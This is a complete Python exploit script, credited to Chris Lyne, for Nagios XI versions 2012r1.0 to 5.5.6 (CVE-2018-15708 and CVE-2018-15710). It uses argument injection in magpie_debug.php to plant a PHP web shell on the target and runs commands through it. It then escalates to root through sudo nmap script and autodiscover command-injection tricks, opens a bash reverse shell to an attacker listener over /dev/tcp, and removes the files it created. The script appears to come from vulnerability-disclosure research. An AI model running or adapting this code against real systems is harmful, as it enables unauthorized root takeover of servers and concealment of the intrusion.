# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: https://www.nagios.com/
# Product: Nagios XI
# Software Link: https://assets.nagios.com/downloads/nagiosxi/5/xi-5.5.6.tar.gz
# Version: From 2012r1.0 to 5.5.6
# Tested on: 
#	- CentOS Linux 7.5.1804 (Core) / Kernel 3.10.0 / This was a vendor-provided .OVA file
#	- Nagios XI 2012r1.0, 5r1.0, and 5.5.6
# CVE: CVE-2018-15708, CVE-2018-15710
#
# See Also:
# https://www.tenable.com/security/research/tra-2018-37
# https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172
#
# This code exploits both CVE-2018-15708 and CVE-2018-15710 to pop a root reverse shell.
# You&#039;ll need your own Netcat listener

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import SocketServer, threading, ssl
import requests, urllib
import sys, os, argparse
from OpenSSL import crypto
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 5 # sec

def err_and_exit(msg):
    print &#039;\n\nERROR: &#039; + msg + &#039;\n\n&#039;
    sys.exit(1)

# handle sending a get request
def http_get_quiet(url):
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False)
    except requests.exceptions.ReadTimeout:
        err_and_exit("Request to &#039;" + url + "&#039; timed out.")
    else:
        return r

# 200?
def url_ok(url):
    r = http_get_quiet(url)
    return (r.status_code == 200)

# run a shell command using the PHP file we uploaded
def send_shell_cmd(path, cmd):
    querystr = { &#039;cmd&#039; : cmd }
    # e.g. http://blah/exec.php?cmd=whoami
    url = path + &#039;?&#039; + urllib.urlencode(querystr)
    return http_get_quiet(url)

# delete some files locally and on the Nagios XI instance
def clean_up(remote, paths, exec_path=None):
    if remote:
        for path in paths:
            send_shell_cmd(exec_path, &#039;rm &#039; + path)
            print &#039;Removing remote file &#039; + path
    else:
        for path in paths:
            os.remove(path)
            print &#039;Removing local file &#039; + path

# Thanks http://django-notes.blogspot.com/2012/02/generating-self-signed-ssl-certificate.html
def generate_self_signed_cert(cert_dir, cert_file, key_file):
    """Generate a SSL certificate.
 
    """
    if not os.path.exists(cert_dir):
        os.makedirs(cert_dir)
    cert_path = os.path.join(cert_dir, cert_file)
    key_path = os.path.join(cert_dir, key_file)
 
    if os.path.exists(cert_path):
        os.unlink(cert_path)
    if os.path.exists(key_path):
        os.unlink(key_path)
 
    # create a key pair
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 1024)
 
    # create a self-signed cert
    cert = crypto.X509()
    cert.get_subject().C = &#039;US&#039;
    cert.get_subject().ST = &#039;Lorem&#039;
    cert.get_subject().L = &#039;Ipsum&#039;
    cert.get_subject().O = &#039;Lorem&#039;
    cert.get_subject().OU = &#039;Ipsum&#039;
    cert.get_subject().CN = &#039;Unknown&#039;
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60) 
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, &#039;sha1&#039;)
 
    with open(cert_path, &#039;wt&#039;) as fd: 
        fd.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
 
    with open(key_path, &#039;wt&#039;) as fd: 
        fd.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
 
    return cert_path, key_path

# HTTP request handler
class MyHTTPD(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        msg = &#039;<?php system($_GET[\&#039;cmd\&#039;]); ?>&#039; # this will be written to the PHP file
        self.end_headers()
        self.wfile.write(str.encode(msg))

# Make the http listener operate on its own thread
class ThreadedWebHandler(object):
    def __init__(self, host, port, keyfile, certfile):
        self.server = SocketServer.TCPServer((host, port), MyHTTPD)
	self.server.socket = ssl.wrap_socket(
	    self.server.socket,
	    keyfile=keyfile,
	    certfile=certfile,
	    server_side=True
	)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

##### MAIN #####

desc = &#039;Nagios XI 2012r1.0 < 5.5.6 MagpieRSS Remote Code Execution and Privilege Escalation&#039;
arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument(&#039;-t&#039;, required=True, help=&#039;Nagios XI IP Address (Required)&#039;)
arg_parser.add_argument(&#039;-ip&#039;, required=True, help=&#039;HTTP listener IP&#039;)
arg_parser.add_argument(&#039;-port&#039;, type=int, default=9999, help=&#039;HTTP listener port (Default: 9999)&#039;)
arg_parser.add_argument(&#039;-ncip&#039;, required=True, help=&#039;Netcat listener IP&#039;)
arg_parser.add_argument(&#039;-ncport&#039;, type=int, default=4444, help=&#039;Netcat listener port (Default: 4444)&#039;)

args = arg_parser.parse_args()

# Nagios XI target settings
target = { &#039;ip&#039; : args.t }

# listener settings
listener = {
    &#039;ip&#039;    : args.ip,
    &#039;port&#039;  : args.port,
    &#039;ncip&#039;  : args.ncip,
    &#039;ncport&#039;: args.ncport
}

# generate self-signed cert
cert_file = &#039;cert.crt&#039;
key_file = &#039;key.key&#039;
generate_self_signed_cert(&#039;./&#039;, cert_file, key_file)

# start threaded listener
# thanks http://brahmlower.io/threaded-http-server.html
server = ThreadedWebHandler(listener[&#039;ip&#039;], listener[&#039;port&#039;], key_file, cert_file)
server.start()

print "\nListening on " + listener[&#039;ip&#039;] + ":" + str(listener[&#039;port&#039;])

# path to Nagios XI app
base_url = &#039;https://&#039; + target[&#039;ip&#039;]

# ensure magpie_debug.php exists
magpie_url = base_url + &#039;/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php&#039;
if not url_ok(magpie_url):
    err_and_exit(&#039;magpie_debug.php not found.&#039;)

print &#039;\nFound magpie_debug.php.\n&#039;

exec_path = None        # path to exec.php in URL
cleanup_paths = []     # local path on Nagios XI filesystem to clean up
# ( local fs path : url path )
paths = [
    ( &#039;/usr/local/nagvis/share/&#039;, &#039;/nagvis&#039; ),
    ( &#039;/var/www/html/nagiosql/&#039;, &#039;/nagiosql&#039; )
]

# inject argument to create exec.php
# try multiple directories if necessary. dir will be different based on nagios xi version
filename = &#039;exec.php&#039;
for path in paths:
    local_path = path[0] + filename # on fs
    url = &#039;https://&#039; + listener[&#039;ip&#039;] + &#039;:&#039; + str(listener[&#039;port&#039;]) + &#039;/%20-o%20&#039; + local_path  # e.g. https://192.168.1.191:8080/%20-o%20/var/www/html/nagiosql/exec.php
    url = magpie_url + &#039;?url=&#039; + url
    print &#039;magpie url = &#039; + url
    r = http_get_quiet(url)

    # ensure php file was created
    exec_url = base_url + path[1] + &#039;/&#039; + filename  # e.g. https://192.168.1.192/nagiosql/exec.php
    if url_ok(exec_url):
        exec_path = exec_url
        cleanup_paths.append(local_path)
        break
    # otherwise, try the next path

if exec_path is None:
    err_and_exit(&#039;Couldn\&#039;t create PHP file.&#039;)

print &#039;\n&#039; + filename + &#039; written. Visit &#039; + exec_url + &#039;\n&#039;

# run a few commands to display status to user
print &#039;Gathering some basic info...&#039;
cmds = [
    (&#039;whoami&#039;, &#039;Current User&#039;),
    ("cat /usr/local/nagiosxi/var/xiversion | grep full | cut -d &#039;=&#039; -f 2", &#039;Nagios XI Version&#039;)
]

for cmd in cmds:
    r = send_shell_cmd(exec_url, cmd[0])
    sys.stdout.write(&#039;\t&#039; + cmd[1] + &#039; => &#039; + r.text)

# candidates for privilege escalation
# depends on Nagios XI version
rev_bash_shell = &#039;/bin/bash -i >& /dev/tcp/&#039; + listener[&#039;ncip&#039;] + &#039;/&#039; + str(listener[&#039;ncport&#039;]) + &#039; 0>&1&#039;
# tuple contains (shell command, cleanup path)
priv_esc_list = [
    ("echo &#039;os.execute(\"" + rev_bash_shell + "\")&#039; > /var/tmp/shell.nse && sudo nmap --script /var/tmp/shell.nse", &#039;/var/tmp/shell.nse&#039;),
    ("sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=&#039;127.0.0.1/1`" + rev_bash_shell + "`&#039;", None)
]

# escalate privileges and launch the connect-back shell
timed_out = False
for priv_esc in priv_esc_list:
    try:
        querystr = { &#039;cmd&#039; : priv_esc[0] }
        url = exec_path + &#039;?&#039; + urllib.urlencode(querystr)
        r = requests.get(url, timeout=TIMEOUT, verify=False)
        print &#039;\nTrying to escalate privs with url: &#039; + url
    except requests.exceptions.ReadTimeout:
        timed_out = True
        if priv_esc[1] is not None:
            cleanup_paths.append(priv_esc[1])
        break

if timed_out:
    print &#039;Check for a shell!!\n&#039;
else:
    print &#039;Not so sure it worked...\n&#039;

server.stop()

# clean up files we created
clean_up(True, cleanup_paths, exec_path) # remote files
clean_up(False, [cert_file, key_file])

